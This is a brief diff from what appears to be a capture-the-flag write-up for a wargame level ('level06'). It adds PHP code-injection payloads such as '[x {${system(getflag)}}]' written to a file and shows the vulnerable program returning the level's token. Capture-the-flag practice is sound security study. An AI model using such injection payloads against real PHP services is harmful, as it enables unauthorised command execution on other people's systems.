@@ -7,6 +7,7 @@ $r = x($argv[1], $argv[2]); print $r;
 ?>
 
 echo '[x ${`getflag`}]' > /tmp/a
+echo '[x {${system(getflag)}}]' > /tmp/a
 
 ./level06 /tmp/a
 PHP Notice:  Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
